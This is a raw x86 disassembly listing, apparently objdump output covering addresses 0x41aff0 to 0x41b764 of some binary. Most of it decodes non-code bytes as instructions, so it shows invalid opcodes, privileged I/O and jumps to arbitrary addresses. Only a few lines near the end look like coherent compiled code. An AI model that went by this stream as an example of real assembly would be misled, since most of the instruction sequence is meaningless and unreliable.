  41aff0:	push   ebx
  41aff1:	ficom  WORD PTR [esp+ebp*8-0x16]
  41aff5:	jns    0x41af8c
  41aff7:	xchg   edi,eax
  41aff8:	push   0xa35902dc
  41affd:	retf   0xa7e0
  41b000:	sbb    al,0x64
  41b002:	mov    dh,0x78
  41b004:	nop
  41b005:	inc    BYTE PTR [eax-0x1c]
  41b008:	call   0x2b0a:0xd9571168
  41b00f:	retf   
  41b010:	pop    esi
  41b011:	adc    BYTE PTR [ebx-0x713bc11],0x7b
  41b018:	dec    ecx
  41b019:	adc    esp,DWORD PTR ds:0x8fe38812
  41b01f:	dec    ecx
  41b020:	inc    edx
  41b021:	mov    ecx,0xea89e8da
  41b026:	adc    eax,0x286f464e
  41b02b:	stos   BYTE PTR es:[edi],al
  41b02c:	inc    ecx
  41b02d:	push   cs
  41b02e:	out    0x12,eax
  41b030:	clc    
  41b031:	cmp    DWORD PTR [edx+edi*1],ecx
  41b034:	xchg   esp,eax
  41b035:	push   ecx
  41b036:	fldcw  WORD PTR [esi+eiz*4-0x4b]
  41b03a:	and    ecx,esi
  41b03c:	les    eax,FWORD PTR [ebx-0x43609baf]
  41b042:	inc    edi
  41b043:	xor    BYTE PTR [ecx+edi*2-0x76],0xe4
  41b048:	jns    0x41b092
  41b04a:	sub    DWORD PTR [edx-0x7d],ebx
  41b04d:	pusha  
  41b04e:	repnz ror DWORD PTR [edx+0xafa7827],cl
  41b055:	stos   DWORD PTR es:[edi],eax
  41b056:	dec    ebp
  41b057:	mov    WORD PTR [eax-0x4a36cbe3],?
  41b05d:	push   ds
  41b05e:	pop    ecx
  41b05f:	push   ebx
  41b060:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b061:	les    eax,FWORD PTR [ebx-0x77]
  41b064:	dec    edi
  41b065:	xor    BYTE PTR [ebp+0x132cb4ed],dl
  41b06b:	aaa    
  41b06c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b06d:	mov    edi,0x11f38747
  41b072:	adc    BYTE PTR [edx+0x73],ah
  41b075:	mov    BYTE PTR [eax+0x19],cl
  41b078:	test   al,0x7
  41b07a:	jp     0x41b081
  41b07c:	aaa    
  41b07d:	pop    edi
  41b07e:	inc    esi
  41b07f:	jge    0x41b027
  41b081:	add    BYTE PTR fs:[ebx-0x38],0x5e
  41b086:	jmp    0x41b036
  41b088:	mov    esp,0xe3040219
  41b08d:	ficomp WORD PTR [edi]
  41b08f:	push   ebx
  41b090:	int    0x9d
  41b092:	mov    BYTE PTR [ecx+0x52],bh
  41b095:	dec    ebx
  41b096:	mov    esp,0x243a2a30
  41b09b:	sbb    eax,DWORD PTR [eax+0xf]
  41b09e:	dec    esi
  41b09f:	data16 aaa 
  41b0a1:	bound  esi,QWORD PTR [edi*8+0x1d35d9e5]
  41b0a8:	mov    DWORD PTR [edi-0x69a92111],edx
  41b0ae:	ins    BYTE PTR es:[edi],dx
  41b0af:	jmp    0xf6bdd4b7
  41b0b4:	stc    
  41b0b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0b6:	test   al,0x69
  41b0b8:	ja     0x41b059
  41b0ba:	icebp  
  41b0bb:	bound  esp,QWORD PTR [edi]
  41b0bd:	aad    0x2b
  41b0bf:	jae    0x41b067
  41b0c1:	loope  0x41b0e1
  41b0c3:	xchg   ebp,eax
  41b0c4:	pushf  
  41b0c5:	ins    BYTE PTR es:[edi],dx
  41b0c6:	sub    eax,0xffffffea
  41b0c9:	ficom  DWORD PTR [eax]
  41b0cb:	jbe    0x41b0bc
  41b0cd:	dec    ecx
  41b0ce:	dec    eax
  41b0cf:	and    eax,edx
  41b0d1:	ret    0x1918
  41b0d4:	lds    edi,FWORD PTR [esi]
  41b0d6:	adc    DWORD PTR [eax],edx
  41b0d8:	mov    al,0x8a
  41b0da:	sar    BYTE PTR [ecx+0x1a],0xa7
  41b0de:	mov    ds:0x3c1fe1c,eax
  41b0e3:	and    eax,esp
  41b0e5:	je     0x41b0df
  41b0e7:	stc    
  41b0e8:	dec    ebp
  41b0e9:	frstor [ebx-0x6cb09fb1]
  41b0ef:	loop   0x41b0c0
  41b0f1:	cmp    al,0xc7
  41b0f3:	dec    edi
  41b0f4:	mov    bl,0x34
  41b0f6:	enter  0xfac1,0xdf
  41b0fa:	sub    BYTE PTR [eax+0x769ac41b],dl
  41b100:	jmp    0x5457:0x1602ce4c
  41b107:	sahf   
  41b108:	mov    ch,0xca
  41b10a:	fcmovnb st,st(0)
  41b10c:	jnp    0x41b0bc
  41b10e:	or     BYTE PTR [ebx+0x418938ea],bh
  41b114:	lods   eax,DWORD PTR ds:[esi]
  41b115:	test   eax,0xfe813685
  41b11a:	xor    DWORD PTR [ebx+0x383eaef4],edx
  41b120:	out    0x1f,al
  41b122:	out    0xb4,al
  41b124:	push   eax
  41b125:	sub    al,BYTE PTR [edx-0x68]
  41b128:	loopne 0x41b121
  41b12a:	dec    ecx
  41b12b:	push   es
  41b12c:	pop    ebx
  41b12d:	xor    edi,edi
  41b12f:	xor    al,0xb0
  41b131:	ins    BYTE PTR es:[edi],dx
  41b132:	out    dx,al
  41b133:	mov    eax,0xd694252e
  41b138:	push   eax
  41b139:	cmp    edi,esi
  41b13b:	sub    al,0xa5
  41b13d:	mov    edi,0x961cbb0d
  41b142:	xor    al,0xa
  41b144:	push   cs
  41b145:	jbe    0x41b112
  41b147:	and    cl,BYTE PTR ds:[esp+esi*8]
  41b14b:	lods   al,BYTE PTR ds:[esi]
  41b14c:	js     0x41b104
  41b14e:	cwde   
  41b14f:	xor    dl,dl
  41b151:	mov    al,0x4c
  41b153:	dec    ebx
  41b154:	push   cs
  41b155:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b156:	out    dx,al
  41b157:	jmp    0x99e3:0xcc62d8d
  41b15e:	mov    edi,DWORD PTR [eax+0x73]
  41b161:	add    DWORD PTR [eax],ebx
  41b163:	or     edi,DWORD PTR [ebp+0x76]
  41b166:	scas   al,BYTE PTR es:[edi]
  41b167:	std    
  41b168:	xchg   ecx,eax
  41b169:	mov    eax,0xc886b5ae
  41b16e:	mov    al,0x59
  41b170:	lahf   
  41b171:	adc    BYTE PTR [ebp-0x3666c8e4],ah
  41b177:	or     al,0x67
  41b179:	daa    
  41b17a:	inc    ebx
  41b17b:	repnz dec ebp
  41b17d:	sbb    eax,0x75995579
  41b182:	or     DWORD PTR [edx+0xa],ebp
  41b185:	(bad)  
  41b187:	jo     0x41b167
  41b189:	call   0x8cf4:0xe215af14
  41b190:	add    ah,al
  41b192:	outs   dx,BYTE PTR ds:[esi]
  41b193:	jmp    0x12051da2
  41b198:	mov    ds:0xc25ce086,eax
  41b19d:	test   DWORD PTR [eax+0x65],esp
  41b1a0:	ja     0x41b190
  41b1a2:	dec    esi
  41b1a3:	jecxz  0x41b193
  41b1a5:	and    al,0xe7
  41b1a7:	cmp    eax,DWORD PTR [edi-0x39b92027]
  41b1ad:	jo     0x41b139
  41b1af:	popf   
  41b1b0:	pop    eax
  41b1b1:	test   al,0x1e
  41b1b3:	sti    
  41b1b4:	pop    edi
  41b1b5:	bswap  edi
  41b1b7:	lds    ebx,FWORD PTR [ecx+0x20]
  41b1ba:	je     0x41b147
  41b1bc:	(bad)  
  41b1bd:	gs jb  0x41b154
  41b1c0:	stos   BYTE PTR es:[edi],al
  41b1c1:	aas    
  41b1c2:	jmp    0xdde0:0x321f1409
  41b1c9:	dec    ebx
  41b1ca:	sub    ch,BYTE PTR [ecx-0x2c053a1a]
  41b1d0:	int3   
  41b1d1:	jecxz  0x41b16b
  41b1d3:	and    al,0xa5
  41b1d5:	pop    ecx
  41b1d7:	fwait
  41b1d8:	or     dh,bl
  41b1da:	(bad)  [edx+ecx*4+0x6e]
  41b1de:	test   DWORD PTR [eax-0x47],eax
  41b1e1:	in     al,0x2a
  41b1e3:	ret    
  41b1e4:	sbb    edx,DWORD PTR [edi+esi*1]
  41b1e7:	adc    edx,DWORD PTR [edi+ecx*4]
  41b1ea:	adc    dh,bl
  41b1ec:	mov    eax,0x24138fa8
  41b1f1:	jp     0x41b250
  41b1f3:	and    DWORD PTR [ecx-0x19],ecx
  41b1f6:	pop    esi
  41b1f7:	mov    cl,0xc3
  41b1f9:	xchg   DWORD PTR [edi-0x7ffd0ee7],edx
  41b1ff:	ss enter 0xcbf6,0xc3
  41b204:	xor    eax,0x4cafdc71
  41b209:	clc    
  41b20a:	mov    eax,DWORD PTR [ebp-0x5294ec42]
  41b210:	inc    esi
  41b211:	inc    edx
  41b212:	sub    ebp,DWORD PTR [edx-0x7d]
  41b215:	pushf  
  41b216:	stc    
  41b217:	retf   
  41b218:	daa    
  41b219:	and    al,0xb9
  41b21b:	repnz inc edx
  41b21d:	xor    bh,bh
  41b21f:	retf   
  41b220:	cdq    
  41b221:	ror    BYTE PTR [eax],1
  41b223:	sub    bh,BYTE PTR [esi-0x1e]
  41b226:	aaa    
  41b227:	stos   BYTE PTR es:[edi],al
  41b228:	sbb    eax,0xdfb2ebaa
  41b22d:	clc    
  41b22e:	dec    eax
  41b22f:	cmp    BYTE PTR [ecx+0x756dc0e3],0x86
  41b236:	fcom   DWORD PTR cs:0x81b273f
  41b23d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b23e:	loope  0x41b25b
  41b240:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b241:	out    dx,al
  41b242:	jmp    0x41b1d2
  41b244:	enter  0xc6e4,0x6e
  41b248:	in     al,0xa8
  41b24a:	es dec esi
  41b24c:	cmp    DWORD PTR es:[ebp-0x62dc2a4],esi
  41b253:	or     al,0x3e
  41b255:	inc    ebp
  41b256:	nop
  41b257:	shr    ah,cl
  41b259:	ja     0x41b1de
  41b25b:	outs   dx,BYTE PTR ds:[esi]
  41b25c:	or     eax,0xdd815e53
  41b261:	push   esp
  41b262:	mov    ah,0xb0
  41b264:	xchg   ebp,eax
  41b265:	test   eax,0xc5a52deb
  41b26a:	push   edi
  41b26b:	push   ds
  41b26c:	(bad)  
  41b26d:	xor    bl,BYTE PTR [ebx+eax*1-0x36250446]
  41b274:	dec    ebp
  41b275:	fdecstp 
  41b277:	cli    
  41b278:	xor    bh,BYTE PTR [ebx]
  41b27a:	add    bl,dh
  41b27c:	iret   
  41b27d:	retf   
  41b27e:	push   esi
  41b27f:	jmp    0x41b2de
  41b281:	ds neg bl
  41b284:	lea    ebx,[esi-0x7f58c0dc]
  41b28a:	push   0xa89e8254
  41b28f:	adc    DWORD PTR [ecx-0x6b],edx
  41b292:	cmp    eax,0xa37ea2
  41b297:	jnp    0x41b25b
  41b299:	or     al,0x51
  41b29b:	or     al,0xa2
  41b29d:	arpl   sp,ax
  41b29f:	pop    esi
  41b2a0:	sbb    BYTE PTR [edx],al
  41b2a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2a3:	nop    DWORD PTR [edx]
  41b2a6:	pop    esi
  41b2a7:	sbb    DWORD PTR cs:[ecx-0x6f],edi
  41b2ab:	push   ebx
  41b2ac:	mov    ds:0xc31be583,al
  41b2b1:	(bad)  
  41b2b2:	sbb    eax,eax
  41b2b4:	int3   
  41b2b5:	in     eax,dx
  41b2b6:	shr    DWORD PTR [edi-0x3e672f55],cl
  41b2bc:	mov    WORD PTR [ecx+0x10668acf],ds
  41b2c2:	sub    dh,BYTE PTR [ebx-0x5b]
  41b2c5:	inc    esi
  41b2c6:	and    al,0x7f
  41b2c8:	pusha  
  41b2c9:	stos   DWORD PTR es:[edi],eax
  41b2ca:	cmp    BYTE PTR [edx+0x2b691cc6],al
  41b2d0:	mov    edi,DWORD PTR [ebp+0x10]
  41b2d3:	sub    cl,al
  41b2d5:	adc    DWORD PTR [ebx-0x505dc5df],ebx
  41b2db:	comiss xmm7,DWORD PTR [edi-0x2c4d730d]
  41b2e2:	add    ecx,DWORD PTR [ebx-0x55]
  41b2e5:	lods   al,BYTE PTR ds:[esi]
  41b2e6:	scas   al,BYTE PTR es:[edi]
  41b2e7:	std    
  41b2e8:	push   esi
  41b2e9:	jmp    0x57a8:0x70c1507c
  41b2f0:	gs aad 0x8c
  41b2f3:	lahf   
  41b2f4:	shl    BYTE PTR cs:[ebp-0x790d16bf],cl
  41b2fb:	into   
  41b2fc:	js     0x41b2e5
  41b2fe:	inc    esp
  41b2ff:	int3   
  41b300:	fadd   QWORD PTR [ebp-0x2c0bad9b]
  41b306:	hlt    
  41b307:	(bad)  
  41b308:	mov    ds:0x8740bbfb,eax
  41b30d:	adc    bh,bh
  41b30f:	sub    BYTE PTR [esi+eax*8+0x55ba4064],bh
  41b316:	std    
  41b317:	rcr    BYTE PTR [ebp-0x7edc0087],cl
  41b31d:	mov    al,ds:0xb7502e3
  41b322:	aam    0x2e
  41b324:	pop    ecx
  41b325:	adc    BYTE PTR [esi],dl
  41b327:	dec    BYTE PTR [ecx]
  41b329:	xchg   edx,eax
  41b32a:	aad    0xe8
  41b32c:	sbb    bh,dh
  41b32e:	dec    ebx
  41b32f:	mov    bl,0x84
  41b331:	sbb    DWORD PTR [edx-0x43],0xffffffbf
  41b335:	retf   0xd3a
  41b338:	sbb    al,0x6
  41b33a:	xchg   edx,eax
  41b33b:	bound  edx,QWORD PTR [eax]
  41b33d:	xor    edx,0xca79a577
  41b343:	shrd   edx,eax,0x2
  41b347:	shr    eax,0x2
  41b34a:	mov    DWORD PTR [esp+0x34],eax
  41b34e:	mov    eax,DWORD PTR [esp+0x18]
  41b352:	mov    ecx,DWORD PTR [esp+0x1c]
  41b356:	jmp    0x41b725
  41b35b:	push   ecx
  41b35c:	(bad)  
  41b35e:	or     BYTE PTR ds:0xaa1d2104,bl
  41b364:	sbb    BYTE PTR [ebx+0x7c],dh
  41b367:	adc    al,0xc2
  41b369:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b36a:	mov    esp,0x18168fbb
  41b36f:	mov    esp,0xd0181812
  41b374:	mov    ch,0x40
  41b376:	loope  0x41b38a
  41b378:	cmp    al,0xc0
  41b37a:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41b37c:	jecxz  0x41b31d
  41b37e:	cmp    DWORD PTR [edi+ebx*1],edx
  41b381:	ins    DWORD PTR es:[edi],dx
  41b382:	add    al,BYTE PTR [edi]
  41b384:	xchg   ebp,eax
  41b385:	shl    BYTE PTR [ecx+0x71],0xd2
  41b389:	mov    ds:0x2f54492,eax
  41b38e:	out    0x9a,al
  41b390:	cmp    DWORD PTR [esi-0x61],esp
  41b393:	out    dx,al
  41b394:	inc    edx
  41b395:	enter  0xfd51,0x2d
  41b399:	pop    eax
  41b39a:	push   edi
  41b39b:	adc    al,0x5e
  41b39d:	out    0x75,eax
  41b39f:	in     eax,0x13
  41b3a1:	(bad)  
  41b3a2:	or     ebx,DWORD PTR [ecx-0x76]
  41b3a5:	mov    ecx,0xf7303282
  41b3aa:	(bad)  [eax-0x9e3f6af]
  41b3b0:	arpl   WORD PTR [ebx+0x4ae6b353],ax
  41b3b6:	xor    eax,0x3a05431a
  41b3bb:	(bad)  
  41b3bc:	xchg   esi,eax
  41b3bd:	pop    es
  41b3be:	sbb    edx,esi
  41b3c0:	mov    bl,0xfc
  41b3c2:	ret    
  41b3c3:	scas   al,BYTE PTR es:[edi]
  41b3c4:	mov    esp,DWORD PTR [edx]
  41b3c6:	mov    cl,bl
  41b3c8:	shr    DWORD PTR [esi+0x54],cl
  41b3cb:	lea    ecx,[ecx-0x3a819168]
  41b3d1:	ror    eax,0x7c
  41b3d4:	aam    0x93
  41b3d6:	test   eax,0xb1fcbe8b
  41b3db:	xor    ch,dh
  41b3dd:	sbb    al,0x41
  41b3df:	pop    ebx
  41b3e0:	aam    0xea
  41b3e2:	rol    DWORD PTR [eax],1
  41b3e4:	sub    edx,DWORD PTR [ebp-0x53]
  41b3e7:	jne    0x41b463
  41b3e9:	dec    edx
  41b3ea:	dec    ebp
  41b3eb:	lds    esp,FWORD PTR [edi]
  41b3ed:	sbb    eax,DWORD PTR [eax+0x7575fbea]
  41b3f3:	lods   al,BYTE PTR ds:[esi]
  41b3f4:	cmp    BYTE PTR [ebx-0x36],0xdd
  41b3f8:	xor    eax,DWORD PTR [edi-0x516f6b83]
  41b3fe:	clc    
  41b3ff:	icebp  
  41b400:	cdq    
  41b401:	fld    TBYTE PTR [ecx-0x405a398f]
  41b407:	add    esp,edx
  41b409:	mov    ebx,0x25d126ce
  41b40e:	and    al,bh
  41b410:	(bad)  
  41b411:	arpl   WORD PTR [edx+0x56ebe077],di
  41b417:	dec    ecx
  41b418:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b419:	jg     0x41b489
  41b41b:	enter  0x3527,0xe0
  41b41f:	cdq    
  41b420:	jbe    0x41b3d2
  41b422:	push   ebx
  41b423:	inc    esp
  41b424:	and    DWORD PTR [eax],esi
  41b426:	mov    edx,DWORD PTR [eax+0x1d]
  41b429:	push   0xffffff91
  41b42b:	icebp  
  41b42c:	test   BYTE PTR [esi+0xca6c030],al
  41b432:	repnz mov ebx,0xd07cfeec
  41b438:	sub    eax,0x619a000f
  41b43d:	rcl    DWORD PTR [ebp-0x46],cl
  41b440:	fs iret 
  41b442:	stos   DWORD PTR es:[edi],eax
  41b443:	mov    bh,0xcc
  41b445:	jl     0x41b3db
  41b447:	and    DWORD PTR [edi-0x3f],edi
  41b44a:	add    BYTE PTR [ebx+0x1f2f3088],cl
  41b450:	nop
  41b451:	xor    ch,BYTE PTR [edx+0x2b86ceff]
  41b457:	shl    edx,cl
  41b459:	adc    DWORD PTR [ebx+0x3d],esi
  41b45c:	adc    cl,BYTE PTR [eax+0x5c]
  41b45f:	inc    DWORD PTR [eax-0x16]
  41b462:	xchg   esi,eax
  41b463:	mov    ah,0xad
  41b465:	loope  0x41b4a8
  41b467:	add    ebp,DWORD PTR [ebp-0x3b1304d5]
  41b46d:	cmp    edi,ebp
  41b46f:	xchg   edx,eax
  41b470:	mov    bh,0x6f
  41b472:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b473:	imul   ebp,DWORD PTR [ebp+0x3b],0xffffffd4
  41b477:	cdq    
  41b478:	out    0xb6,eax
  41b47a:	and    dl,BYTE PTR [ecx-0x3a9e764f]
  41b480:	out    0xec,eax
  41b482:	push   ds
  41b483:	div    BYTE PTR [eax]
  41b485:	push   ss
  41b486:	mov    BYTE PTR [ebx+edi*8],ah
  41b489:	shr    BYTE PTR [edx-0x1e1f9be4],1
  41b48f:	adc    DWORD PTR [eax+0x6b829cde],ecx
  41b495:	sahf   
  41b496:	and    BYTE PTR [ecx],0x4b
  41b499:	(bad)  
  41b49a:	jnp    0x41b46d
  41b49c:	outs   dx,DWORD PTR ds:[esi]
  41b49d:	push   ebp
  41b49e:	ja     0x41b446
  41b4a0:	adc    ecx,ebx
  41b4a2:	dec    ebp
  41b4a3:	adc    eax,0x2e2de3d7
  41b4a8:	pop    esp
  41b4a9:	call   0x5ba6:0x1edd65bf
  41b4b0:	jmp    DWORD PTR [ebx-0x3eae43fc]
  41b4b6:	div    BYTE PTR [ebp-0x11]
  41b4b9:	int    0x7a
  41b4bb:	dec    ebp
  41b4bc:	push   ecx
  41b4bd:	inc    eax
  41b4be:	mov    edx,DWORD PTR [ecx+eax*2]
  41b4c1:	ins    BYTE PTR es:[edi],dx
  41b4c2:	mov    bl,0x39
  41b4c4:	arpl   WORD PTR ds:0x941a45bb,sp
  41b4ca:	and    eax,0xa88ba46f
  41b4cf:	es sbb al,0xd9
  41b4d2:	mov    BYTE PTR [eax+0x5aa9536b],dl
  41b4d8:	sub    DWORD PTR [eax-0x70],ebx
  41b4db:	inc    edx
  41b4dc:	pop    ebp
  41b4dd:	inc    esi
  41b4de:	jns    0x41b4f5
  41b4e0:	nop
  41b4e1:	mov    ecx,edx
  41b4e3:	jle    0x41b538
  41b4e5:	in     eax,dx
  41b4e6:	ins    DWORD PTR es:[edi],dx
  41b4e7:	mov    bh,0xfb
  41b4e9:	dec    ebp
  41b4ea:	pop    ecx
  41b4eb:	jmp    0xcf17:0xd881cccf
  41b4f2:	inc    ecx
  41b4f3:	xchg   ecx,eax
  41b4f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4f5:	mov    esi,0x1192b74e
  41b4fa:	push   es
  41b4fb:	pusha  
  41b4fc:	cmp    esi,DWORD PTR [edx-0x3f]
  41b4ff:	aam    0xcf
  41b501:	ins    BYTE PTR es:[edi],dx
  41b502:	push   0x8324d6d5
  41b507:	adc    esp,DWORD PTR [edx-0x57a84c97]
  41b50d:	mov    BYTE PTR [ecx-0x5e],dh
  41b510:	aas    
  41b511:	or     esi,esi
  41b513:	outs   dx,BYTE PTR ds:[esi]
  41b514:	sbb    BYTE PTR [edi-0x5dbdbaa2],0xc9
  41b51b:	ror    DWORD PTR ds:0xd81f5eeb,cl
  41b521:	dec    esp
  41b522:	jle    0x41b4ec
  41b524:	addr16 jns 0x41b4b3
  41b527:	xchg   esp,eax
  41b529:	fst    QWORD PTR [ebx]
  41b52b:	add    esi,edx
  41b52d:	ret    0x6abb
  41b530:	sub    eax,0x5e3639b1
  41b535:	or     al,ch
  41b537:	in     al,0xce
  41b539:	xor    ebx,DWORD PTR [ebx-0x4c031c6e]
  41b53f:	sti    
  41b540:	push   ecx
  41b541:	data16 sahf 
  41b543:	scas   eax,DWORD PTR es:[edi]
  41b544:	sub    eax,0xae1a6607
  41b549:	ror    DWORD PTR [edi-0x3680b94c],1
  41b54f:	cwde   
  41b550:	outs   dx,BYTE PTR ds:[esi]
  41b551:	pop    ds
  41b552:	ss sub eax,0xc00ea51c
  41b558:	popa   
  41b559:	jns    0x41b570
  41b55b:	sbb    esi,DWORD PTR [esi+0x6c400a32]
  41b561:	popf   
  41b562:	shl    eax,1
  41b564:	fisttp DWORD PTR [esi+edx*2-0x29]
  41b568:	or     eax,0x43fb8256
  41b56d:	dec    esp
  41b56e:	retf   
  41b56f:	or     BYTE PTR [esi+0x58ab40b7],cl
  41b575:	ss clc 
  41b577:	clc    
  41b578:	daa    
  41b579:	pop    es
  41b57a:	sub    ch,BYTE PTR [eax]
  41b57c:	cmp    BYTE PTR [ebx-0x394bdf9a],cl
  41b582:	daa    
  41b583:	pop    esi
  41b584:	cdq    
  41b585:	sub    edi,DWORD PTR [ebx+0x6c]
  41b588:	adc    DWORD PTR [eax+0x53],eax
  41b58b:	data16 jo 0x41b561
  41b58e:	addr16 push ds
  41b590:	aaa    
  41b591:	dec    edx
  41b592:	test   BYTE PTR [edi],al
  41b594:	popa   
  41b595:	ficomp WORD PTR [ecx-0x292c404a]
  41b59b:	and    al,0xd8
  41b59d:	xor    eax,0x6b7002e7
  41b5a2:	pop    es
  41b5a3:	jo     0x41b5fd
  41b5a5:	sti    
  41b5a6:	pop    edi
  41b5a7:	vpsllw ymm3,ymm5,XMMWORD PTR [edx-0x41ee531e]
  41b5af:	sahf   
  41b5b0:	xchg   DWORD PTR [edx-0x33ae2961],esp
  41b5b6:	in     eax,0x4b
  41b5b8:	fld    DWORD PTR [edx]
  41b5ba:	rsqrtps xmm3,XMMWORD PTR [esi+0x24]
  41b5be:	or     al,BYTE PTR [ebx+0x46e4eca6]
  41b5c4:	lock test BYTE PTR [edi],cl
  41b5c7:	stc    
  41b5c8:	gs jnp 0x41b582
  41b5cb:	inc    esp
  41b5cc:	mov    ch,0x51
  41b5ce:	xchg   esp,eax
  41b5cf:	mov    BYTE PTR [ebx-0x5c32a862],dl
  41b5d5:	jae    0x41b648
  41b5d7:	leave  
  41b5d8:	cmp    BYTE PTR [ebx],0xf4
  41b5db:	int    0xb5
  41b5dd:	push   edx
  41b5de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5df:	ss loopne 0x41b64d
  41b5e2:	sbb    BYTE PTR [ebx+0xb],bl
  41b5e5:	sbb    edx,esp
  41b5e7:	pop    ds
  41b5e8:	cli    
  41b5e9:	mov    DWORD PTR [ecx+0x18],esp
  41b5ec:	aam    0x5e
  41b5ee:	cmp    DWORD PTR [ecx],edx
  41b5f0:	dec    esp
  41b5f1:	test   esi,ebp
  41b5f3:	and    bl,dl
  41b5f5:	xor    al,0xf0
  41b5f7:	lods   eax,DWORD PTR ds:[esi]
  41b5f8:	pop    ds
  41b5f9:	jb     0x41b5e1
  41b5fb:	pop    esp
  41b5fc:	stos   BYTE PTR es:[edi],al
  41b5fd:	nop
  41b5fe:	inc    ebp
  41b5ff:	pop    esi
  41b600:	mov    dh,0x4d
  41b602:	dec    ebp
  41b603:	fsub   DWORD PTR [eiz*8-0x79dc0c32]
  41b60a:	pusha  
  41b60b:	daa    
  41b60c:	inc    ebx
  41b60d:	xchg   ah,ch
  41b60f:	xor    BYTE PTR [edi-0x3c],cl
  41b612:	mov    ch,BYTE PTR [edx+0x2b280e4f]
  41b618:	jb     0x41b670
  41b61a:	psraw  mm4,QWORD PTR [ebx]
  41b61d:	mov    edi,0x49670196
  41b622:	fdiv   QWORD PTR [edx-0x291f99b9]
  41b628:	out    dx,eax
  41b629:	push   edx
  41b62a:	xor    ebx,DWORD PTR [eax+0x6f92913c]
  41b630:	(bad)  
  41b631:	dec    ebx
  41b632:	pop    edi
  41b633:	xchg   ecx,eax
  41b634:	mov    bh,bh
  41b636:	(bad)  
  41b637:	xor    edi,DWORD PTR [esi]
  41b639:	out    0x5,al
  41b63b:	xchg   esp,eax
  41b63c:	cli    
  41b63d:	rcr    WORD PTR [eax-0x302c8409],1
  41b644:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b645:	loope  0x41b5e4
  41b647:	pop    ss
  41b648:	mov    WORD PTR [edi-0xec3272e],es
  41b64e:	jae    0x41b5fe
  41b650:	add    BYTE PTR [ebp+edx*2-0x63],dh
  41b654:	push   ebx
  41b655:	rcr    DWORD PTR [ebx-0x45fda0be],0x88
  41b65c:	adc    edi,DWORD PTR [edi]
  41b65e:	mov    ebx,0xce5b7ed5
  41b663:	jne    0x41b680
  41b665:	xor    BYTE PTR [eax-0x76],dl
  41b668:	retf   
  41b669:	sub    BYTE PTR [eax+0x3d911352],cl
  41b66f:	jo     0x41b6cb
  41b671:	(bad)  
  41b672:	lahf   
  41b673:	and    al,0x80
  41b675:	or     esp,DWORD PTR [edx-0x14]
  41b678:	dec    edi
  41b679:	scas   al,BYTE PTR es:[edi]
  41b67a:	sub    eax,0xcf66ab26
  41b67f:	dec    esp
  41b680:	mov    dl,0x3
  41b682:	fsub   QWORD PTR [ebp+0x14d9f145]
  41b688:	inc    ebx
  41b689:	shl    BYTE PTR [esi],0x68
  41b68c:	ins    BYTE PTR es:[edi],dx
  41b68d:	add    DWORD PTR [eax-0x46],edx
  41b690:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b691:	je     0x41b689
  41b693:	pop    eax
  41b694:	inc    eax
  41b695:	sti    
  41b696:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b697:	stc    
  41b698:	push   ebp
  41b699:	xor    eax,0xa577003f
  41b69e:	out    0x56,al
  41b6a0:	xchg   esi,eax
  41b6a1:	int    0x55
  41b6a3:	(bad)
  41b6a6:	in     eax,dx
  41b6a7:	ss mov edi,0xc513da6e
  41b6ad:	(bad)  
  41b6ae:	xor    al,0xc3
  41b6b0:	jae    0x41b6cc
  41b6b2:	into   
  41b6b3:	jno    0x41b724
  41b6b5:	cmp    ebx,DWORD PTR [eax+esi*8-0x37360302]
  41b6bc:	sub    ebp,edi
  41b6be:	sbb    DWORD PTR [esp+eiz*8+0x16aaf5f],eax
  41b6c5:	add    BYTE PTR [esi+0x324c5b01],dh
  41b6cb:	ins    BYTE PTR es:[edi],dx
  41b6cc:	rcl    BYTE PTR [eax+0x6c49c23d],0x3f
  41b6d3:	lods   eax,DWORD PTR ds:[esi]
  41b6d4:	push   0xab041aef
  41b6d9:	test   DWORD PTR [edx-0x13],esp
  41b6dc:	cli    
  41b6dd:	push   cs
  41b6de:	fs loopne 0x41b6f4
  41b6e1:	dec    ecx
  41b6e2:	pop    ebp
  41b6e3:	es popa 
  41b6e5:	and    ah,BYTE PTR [eax+0x5f]
  41b6e8:	fcomip st,st(4)
  41b6ea:	sbb    BYTE PTR [ecx+0x1b5e4558],dh
  41b6f0:	or     BYTE PTR [eax-0x1334353d],0x39
  41b6f7:	rcl    dh,cl
  41b6f9:	mov    al,ch
  41b6fb:	dec    edx
  41b6fc:	test   BYTE PTR [ecx],0x52
  41b6ff:	(bad)  
  41b701:	shr    ch,cl
  41b703:	sbb    BYTE PTR [ebx+0x118327e0],ah
  41b709:	adc    BYTE PTR [ecx+0x5ad784e7],dl
  41b70f:	fucomi st,st(0)
  41b711:	ins    BYTE PTR es:[edi],dx
  41b712:	fild   WORD PTR [edx-0x787dbbe8]
  41b718:	(bad)  
  41b719:	xor    eax,0xc43bd2b9
  41b71e:	push   esi
  41b71f:	(bad)  
  41b720:	and    BYTE PTR [edx+0x60],dh
  41b723:	sbb    al,0xc1
  41b726:	loopne 0x41b746
  41b728:	xor    eax,0x40000000
  41b72d:	or     eax,DWORD PTR [esp+0x34]
  41b731:	xor    ecx,ecx
  41b733:	mov    DWORD PTR [esp+0x14],eax
  41b737:	mov    eax,DWORD PTR [esp+0x60]
  41b73b:	or     ecx,edx
  41b73d:	cdq    
  41b73e:	cmp    ecx,eax
  41b740:	jne    0x41d926
  41b746:	cmp    DWORD PTR [esp+0x14],edx
  41b74a:	jne    0x41d926
  41b750:	mov    DWORD PTR [esp+0x5c],0x4225b4
  41b758:	mov    DWORD PTR [esp+0x68],0x4225ac
  41b760:	mov    eax,DWORD PTR [esp+0x78]
  41b764:	mov    eax,DWORD PTR [esp+0x78]
